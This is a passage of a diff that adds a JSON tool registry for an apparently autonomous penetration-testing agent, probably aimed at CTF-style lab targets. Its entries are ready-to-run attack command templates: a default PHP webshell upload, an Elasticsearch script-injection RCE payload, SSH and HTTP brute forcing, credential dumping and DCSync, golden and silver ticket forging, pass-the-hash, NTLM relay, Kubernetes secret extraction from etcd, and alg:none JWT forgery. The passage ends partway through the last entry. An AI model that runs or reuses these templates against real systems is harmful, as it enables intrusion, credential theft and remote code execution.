+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "image": {
+          "type": "string",
+          "description": "Source image (e.g. 'busybox:latest')"
+        },
+        "target_registry": {
+          "type": "string",
+          "description": "Target registry (e.g. 'localhost:5000')"
+        },
+        "image_name": {
+          "type": "string",
+          "description": "Image name at target registry"
+        }
+      },
+      "required": [
+        "image",
+        "target_registry",
+        "image_name"
+      ],
+      "executor": "shell",
+      "command_template": "docker pull {image} 2>&1 && docker tag {image} {target_registry}/{image_name} 2>&1 && docker push {target_registry}/{image_name} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "elasticsearch_query",
+      "version": "1.0.0",
+      "description": "Query Elasticsearch REST API. Use for data extraction (search queries), index enumeration, and script injection attacks. method: GET for read, POST for search with body. path: API path (e.g. '/_cat/indices?v', '/_search', '/_cluster/health'). body_json: for POST, pass '-d {json}' with search body containing script_fields for script injection (Elasticsearch dynamic scripting). Unauth access common on default installations.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Elasticsearch host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "Elasticsearch port (default 9200)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: GET, POST, PUT"
+        },
+        "path": {
+          "type": "string",
+          "description": "API path (e.g. '/_cat/indices?v', '/_search', '/flag_index/_search')"
+        },
+        "body_json": {
+          "type": "string",
+          "description": "For POST/PUT: body as JSON string, prefixed with '-d ' (e.g. '-d \\'{\"query\":{\"match_all\":{}}}\\''). Leave empty for GET requests. For script injection: '-d \\'{\"script_fields\":{\"rce\":{\"script\":\"Runtime.getRuntime().exec(\\\\\"id\\\\\")\"}}}\\''"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "method",
+        "path",
+        "body_json"
+      ],
+      "executor": "shell",
+      "command_template": "curl -s -X {method} 'http://{host}:{port}{path}' -H 'Content-Type: application/json' {body_json} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "etcdctl_get",
+      "version": "1.0.0",
+      "description": "Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. For HTTPS endpoints automatically adds --insecure-skip-tls-verify (override with insecure=false). Supports mutual TLS via cacert/cert/tls_key params. Use --prefix --keys-only for exploration, -o json for full values.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "endpoint": {
+          "type": "string",
+          "description": "etcd endpoint (e.g. 'http://localhost:11379', 'https://10.0.0.1:2379')"
+        },
+        "key": {
+          "type": "string",
+          "description": "etcd key to read. Default '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'"
+        },
+        "output_opts": {
+          "type": "string",
+          "description": "Additional etcdctl options. Use '--prefix --keys-only' for key discovery, '-o json' for full value output of a specific key, '--prefix -o json' for all keys with values"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS certificate verification for HTTPS endpoints (default true). Set false if valid certs available."
+        },
+        "cacert": {
+          "type": "string",
+          "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"
+        },
+        "cert": {
+          "type": "string",
+          "description": "Path to client certificate for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.crt)"
+        },
+        "tls_key": {
+          "type": "string",
+          "description": "Path to client key for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.key)"
+        }
+      },
+      "required": [
+        "endpoint",
+        "key",
+        "output_opts",
+        "insecure",
+        "cacert",
+        "cert",
+        "tls_key"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ffuf_fuzz",
+      "version": "1.0.0",
+      "description": "Fuzz web parameters or paths using ffuf",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL with FUZZ keyword"
+        }
+      },
+      "required": [
+        "url"
+      ],
+      "executor": "shell",
+      "command_template": "ffuf -u '{url}' -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302,403 -o /dev/null 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "file_upload",
+      "version": "1.0.0",
+      "description": "Upload a file via multipart POST (curl -F). Use for unauthenticated file upload exploits — WordPress plugin RCE, PHP webshell delivery, arbitrary file upload vulnerabilities. IMPORTANT: many plugin upload endpoints require additional POST parameters (IDs, directories, nonces). If you get HTTP 400/403/500, use extra_fields to add required form fields. Example: extra_fields={\"eeSFL_ID\":\"1\", \"eeSFL_FileUploadDir\":\"/wp-content/uploads/\"}",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Upload endpoint URL (e.g. 'http://target/wp-content/plugins/x/ee-upload-engine.php')"
+        },
+        "field": {
+          "type": "string",
+          "description": "Form field name for the file (default: 'file')"
+        },
+        "filename": {
+          "type": "string",
+          "description": "Filename to upload (default: 'payload.php'). Use .php extension for PHP webshells."
+        },
+        "content": {
+          "type": "string",
+          "description": "File content to upload (default: simple PHP webshell '<?php system($_GET[\"cmd\"]); ?>')"
+        },
+        "timeout": {
+          "type": "integer",
+          "description": "Upload timeout in seconds (default: 30)"
+        },
+        "extra_fields": {
+          "type": "object",
+          "description": "Additional form fields as JSON object. REQUIRED for many plugins. Example: {\"eeSFL_ID\": \"1\", \"eeSFL_FileUploadDir\": \"/wp-content/uploads/\"} or {\"action\": \"upload\", \"nonce\": \"...\"}. Look for required POST params in plugin docs or error responses."
+        }
+      },
+      "required": [
+        "url",
+        "field",
+        "filename",
+        "content",
+        "timeout",
+        "extra_fields"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "form_extract",
+      "version": "1.0.0",
+      "description": "Extract all HTML forms, inputs, and links from a URL. Returns structured JSON.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "URL to extract forms from"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "gcloud_cli",
+      "version": "1.0.0",
+      "description": "Execute Google Cloud CLI commands. Supports: compute (instances list/describe/disks), storage (gsutil ls/cp), iam (roles list/service-accounts list/service-accounts keys create/get-iam-policy), projects (get-iam-policy/set-iam-policy), kms (keys list/decrypt), functions (list/describe), sql (instances list). Use for GCP IMDS credentials (from check_cloud_metadata) to access GCP services.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "service": {
+          "type": "string",
+          "description": "GCP service: compute, storage, iam, projects, kms, functions, sql"
+        },
+        "action": {
+          "type": "string",
+          "description": "Action: instances, list, describe, ls, cp, roles, service-accounts, keys, get-iam-policy, set-iam-policy, decrypt"
+        },
+        "resource": {
+          "type": "string",
+          "description": "Resource identifier (e.g. instance name, bucket URL gs://bucket, role name, key ring)"
+        },
+        "flags": {
+          "type": "string",
+          "description": "Additional flags: --zone, --project, --keyring, --location, --member (default: '')",
+          "default": ""
+        }
+      },
+      "required": [
+        "service",
+        "action",
+        "resource"
+      ],
+      "executor": "shell",
+      "command_template": "gcloud {service} {action} {resource} {flags} --format json 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "getnthash",
+      "version": "1.0.0",
+      "description": "Recover NT hash via PKINIT U2U (User-to-User) authentication. Use after gettgtpkinit — the AS-REP encryption key from the TGT can be used to recover the user's NT hash without DCSync.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "target_user": {
+          "type": "string",
+          "description": "Target username"
+        },
+        "asrep_key": {
+          "type": "string",
+          "description": "AS-REP encryption key from gettgtpkinit output"
+        }
+      },
+      "required": [
+        "domain",
+        "target_user",
+        "asrep_key"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /opt/PKINITtools/getnthash.py -key {asrep_key} {domain}/{target_user} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "gettgtpkinit",
+      "version": "1.0.0",
+      "description": "Get Kerberos TGT via PKINIT using a certificate and private key (from Shadow Credentials attack). Use after pywhisker to authenticate as the target user. Outputs a ccache file for use with impacket tools.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "target_user": {
+          "type": "string",
+          "description": "Target username to authenticate as"
+        },
+        "cert_pem": {
+          "type": "string",
+          "description": "Path to certificate PEM file",
+          "default": "/tmp/cert.pem"
+        },
+        "key_pem": {
+          "type": "string",
+          "description": "Path to private key PEM file",
+          "default": "/tmp/key.pem"
+        },
+        "ccache_file": {
+          "type": "string",
+          "description": "Output ccache file path",
+          "default": "/tmp/user.ccache"
+        }
+      },
+      "required": [
+        "domain",
+        "target_user"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem {cert_pem} -key-pem {key_pem} {domain}/{target_user} {ccache_file} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "go_exploitdb_search",
+      "version": "1.0.0",
+      "description": "Search local go-exploitdb for public exploits matching a CVE ID or keyword. Returns exploit type, description, and references. Requires go-exploitdb database (fetch with: go-exploitdb fetch).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "query": {
+          "type": "string",
+          "description": "CVE ID or keyword to search for (e.g. 'CVE-2021-44228', 'Apache')"
+        },
+        "limit": {
+          "type": "integer",
+          "description": "Max results (default 10)"
+        }
+      },
+      "required": [
+        "query",
+        "limit"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "gobuster_dir",
+      "version": "1.0.0",
+      "description": "Fast directory brute-force using gobuster. Uses raft-large-directories.txt wordlist by default. Automatically skips TLS verification (-k) for self-signed certs. Target URL must include scheme (e.g. https://host:port).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL with scheme (e.g. http://host:port)"
+        },
+        "url": {
+          "type": "string",
+          "description": "Alias for target_url — same as target_url parameter"
+        },
+        "wordlist": {
+          "type": "string",
+          "description": "Wordlist path",
+          "default": "/home/kianabin/Darwin/wordlists/raft-large-directories.txt"
+        }
+      },
+      "required": [
+        "target_url",
+        "url"
+      ],
+      "executor": "shell",
+      "command_template": "gobuster -u {target_url} -w {wordlist} -m dir -k -q 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "gpp_decrypt",
+      "version": "1.0.0",
+      "description": "Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value from SYSVOL Groups.xml. Decrypts AES-256-CBC encrypted passwords using the publicly documented Microsoft GPP key. Use after retrieving Groups.xml via smb_client from \\\\DOMAIN\\SYSVOL. Input is the base64-encoded cpassword string from the XML.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "cpassword": {
+          "type": "string",
+          "description": "Base64-encoded cpassword value from Groups.xml (e.g. from <Properties cpassword='...'>)"
+        }
+      },
+      "required": [
+        "cpassword"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "graphql_introspect",
+      "version": "1.0.0",
+      "description": "Query a GraphQL endpoint for schema discovery and data extraction. Introspection mode dumps the full schema — all types, queries, mutations, and their arguments. Use for IDOR discovery: look for queries accepting user IDs or other identifiers that can be manipulated. Custom queries can extract data from discovered types.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "GraphQL endpoint URL (e.g. 'http://target:10116/graphql')"
+        },
+        "query_type": {
+          "type": "string",
+          "description": "'introspection' for schema discovery, or 'query' to use custom query_body"
+        },
+        "query_body": {
+          "type": "string",
+          "description": "Custom GraphQL query when query_type is 'query'. Example: '{getPrescriptions(userId:1){id medication}}'"
+        }
+      },
+      "required": [
+        "target_url",
+        "query_type",
+        "query_body"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "hash_crack",
+      "version": "1.0.0",
+      "description": "Attempt to crack a password hash offline using hashcat or john-the-ripper. Auto-detects hash type from prefix ($krb5tgs$=Kerberoast mode 13100, $krb5asrep$=AS-REP mode 18200, 32-char hex=NTLM mode 1000, $2a$/$2b$=bcrypt mode 3200, $6$=SHA-512 mode 1800). Uses rockyou.txt wordlist by default. Specify hash_type manually if auto-detection fails. This is a general hash-cracking capability — it works against any compatible hash, not just Kerberos.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "hash_string": {
+          "type": "string",
+          "description": "Complete hash string (e.g. $krb5tgs$23$*... for Kerberoast, $krb5asrep$23$*... for AS-REP, or 32-char hex for NTLM)"
+        },
+        "hash_type": {
+          "type": "string",
+          "description": "Optional hashcat mode number. Auto-detected from prefix if omitted. Common modes: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512"
+        },
+        "timeout": {
+          "type": "integer",
+          "description": "Max cracking time in seconds (default 120, max 600)"
+        }
+      },
+      "required": [
+        "hash_string",
+        "hash_type",
+        "timeout"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "helm",
+      "version": "1.0.0",
+      "description": "Execute a Helm command. For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) - use --host for connecting to Tiller directly.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "command": {
+          "type": "string",
+          "description": "Full helm command. For Tiller: '--host <svc>.<ns>:44134 ls --all'"
+        }
+      },
+      "required": [
+        "command"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "helm",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "http_post",
+      "version": "1.0.0",
+      "description": "Send HTTP POST request. Use insecure=true for self-signed TLS. Use cookie parameter for session.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL"
+        },
+        "data": {
+          "type": "string",
+          "description": "POST body data (key=value&key=value format)"
+        },
+        "headers": {
+          "type": "string",
+          "description": "Optional headers"
+        },
+        "cookie": {
+          "type": "string",
+          "description": "Session cookie string from try_login"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "data",
+        "headers",
+        "cookie",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "hydra_http_brute",
+      "version": "1.0.0",
+      "description": "Brute force HTTP login form with common password using hydra",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target login URL"
+        },
+        "userlist": {
+          "type": "string",
+          "description": "Path to username wordlist"
+        },
+        "passlist": {
+          "type": "string",
+          "description": "Path to password wordlist"
+        }
+      },
+      "required": [
+        "url",
+        "userlist",
+        "passlist"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "hydra_ssh_brute",
+      "version": "1.0.0",
+      "description": "Brute force SSH login with common passwords using hydra",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target hostname or IP"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "hydra -l root -P /usr/share/dirb/wordlists/common.txt ssh://{target} -t 4 -f 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "idor_header_test",
+      "version": "1.0.0",
+      "description": "Test for IDOR via HTTP headers (X-UserId, X-User-Id) with various user IDs. Use when you have a session cookie and suspect IDOR.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL (e.g. dashboard endpoint)"
+        },
+        "cookie": {
+          "type": "string",
+          "description": "Session cookie from try_login"
+        },
+        "user_ids": {
+          "type": "string",
+          "description": "Comma-separated user IDs to try (default: 0,1,2,3,10032,10033)"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "cookie",
+        "user_ids",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_GetNPUsers",
+      "version": "1.0.0",
+      "description": "AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Set user='' and password='' for unauthenticated AS-REP roasting with -no-pass.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Active Directory domain name"
+        },
+        "dc_ip": {
+          "type": "string",
+          "description": "Domain Controller IP address"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username (optional, omit for -no-pass)"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password (optional, omit for -no-pass)"
+        }
+      },
+      "required": [
+        "domain",
+        "dc_ip",
+        "user",
+        "password"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_GetUserSPNs",
+      "version": "1.0.0",
+      "description": "Kerberoasting: request TGS tickets for users with SPNs. Encrypted tickets can be cracked offline. Set user='' and password='' for unauthenticated Kerberoasting with -no-pass.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Active Directory domain name"
+        },
+        "dc_ip": {
+          "type": "string",
+          "description": "Domain Controller IP address"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username (optional, omit for -no-pass)"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password (optional, omit for -no-pass)"
+        }
+      },
+      "required": [
+        "domain",
+        "dc_ip",
+        "user",
+        "password"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_getST",
+      "version": "1.0.0",
+      "description": "S4U2Self/S4U2Proxy Constrained Delegation: request a service ticket on behalf of another user via Kerberos constrained delegation. Use when a service account has msDS-AllowedToDelegateTo configured. Target format: DOMAIN/USER:PASSWORD@DC_IP.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "spn": {
+          "type": "string",
+          "description": "Target service SPN (e.g. 'ldap/dc01.domain.local', 'cifs/dc01.domain.local')"
+        },
+        "target_user": {
+          "type": "string",
+          "description": "User to impersonate (e.g. 'Administrator')"
+        },
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER:PASSWORD@DC_IP for authentication"
+        }
+      },
+      "required": [
+        "spn",
+        "target_user",
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/getST.py -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_ntlmrelayx",
+      "version": "1.0.0",
+      "description": "Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"
+        },
+        "extra_args": {
+          "type": "string",
+          "description": "Additional ntlmrelayx arguments (e.g. '-smb2support --adcs')"
+        }
+      },
+      "required": [
+        "target_url",
+        "extra_args"
+      ],
+      "executor": "shell",
+      "command_template": "timeout 30 python3 /home/kianabin/Darwin/venv/bin/ntlmrelayx.py -t {target_url} {extra_args} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_psexec",
+      "version": "1.0.0",
+      "description": "Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER:PASSWORD@TARGET"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/psexec.py {target} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_pth",
+      "version": "1.0.0",
+      "description": "Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "nthash": {
+          "type": "string",
+          "description": "NTLM hash (NT part, 32 hex chars)"
+        },
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER@TARGET_IP"
+        }
+      },
+      "required": [
+        "nthash",
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/psexec.py -hashes :{nthash} {target} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_secretsdump",
+      "version": "1.0.0",
+      "description": "Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER:PASSWORD@TARGET"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/secretsdump.py {target} 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_secretsdump_dcsync",
+      "version": "1.0.0",
+      "description": "DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER:PASSWORD@DC_IP"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/secretsdump.py -just-dc {target} 2>&1 | head -100",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_silver_ticket",
+      "version": "1.0.0",
+      "description": "Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "service_hash": {
+          "type": "string",
+          "description": "Target service account NTLM hash (32 hex chars)"
+        },
+        "domain_sid": {
+          "type": "string",
+          "description": "Domain SID (e.g. S-1-5-21-...)"
+        },
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "service_spn": {
+          "type": "string",
+          "description": "Service SPN (e.g. 'cifs/dc.domain.com', 'http/web.domain.com', 'HOST/dc.domain.com')"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username to impersonate (default: Administrator)"
+        }
+      },
+      "required": [
+        "service_hash",
+        "domain_sid",
+        "domain",
+        "service_spn",
+        "user"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_ticketer",
+      "version": "1.0.0",
+      "description": "Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "krbtgt_hash": {
+          "type": "string",
+          "description": "KRBTGT account NTLM hash"
+        },
+        "domain_sid": {
+          "type": "string",
+          "description": "Domain SID (e.g. S-1-5-21-...)"
+        },
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username to impersonate (default: Administrator)"
+        }
+      },
+      "required": [
+        "krbtgt_hash",
+        "domain_sid",
+        "domain",
+        "user"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "impacket_wmiexec",
+      "version": "1.0.0",
+      "description": "Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "DOMAIN/USER:PASSWORD@TARGET"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "python3 /home/kianabin/Darwin/venv/bin/wmiexec.py {target} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "jwt_forge",
+      "version": "1.0.0",
+      "description": "Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "secret": {
+          "type": "string",
+          "description": "JWT signing secret or key"
+        },
+        "algorithm": {
+          "type": "string",
+          "description": "JWT algorithm: HS256, HS384, HS512, RS256, or 'none' (unsigned alg:none attack). Default HS256.",
+          "default": "HS256"
+        },
+        "claims_b64": {
+          "type": "string",
+          "description": "Base64-encoded JSON claims payload"
+        },
+        "claims": {
+          "type": "string",
